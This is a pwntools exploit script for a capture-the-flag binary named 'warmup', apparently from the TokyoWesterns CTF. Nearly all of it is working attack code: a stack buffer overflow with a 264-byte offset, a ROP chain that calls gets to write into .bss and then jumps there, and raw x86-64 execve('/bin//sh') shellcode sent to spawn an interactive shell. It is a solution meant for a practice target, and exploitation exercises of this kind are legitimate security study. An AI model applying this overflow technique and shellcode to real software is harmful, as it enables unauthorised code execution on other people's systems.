from pwn import *


elf = ELF("./warmup")
# p = remote("nothing.chal.ctf.westerns.tokyo", 10001)
p = elf.process()

context.binary = './warmup'
context.terminal = ['terminator', '-e']

# attach gdb and continue
gdb.attach(p.pid, '''b *0x00000000004006ea''')

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

offset = 264
pop_rdi = 0x0000000000400773
payload = "A"*offset
payload += p64(pop_rdi)
payload += p64(elf.bss(0x600))
payload += p64(elf.plt["gets"])
payload += p64(elf.bss(0x600))

with open("payload", "wb") as f:
    f.write(payload)

with open("payload2", "wb") as f:
    f.write(shellcode)

p.sendline(payload)
p.sendline(shellcode)

p.interactive()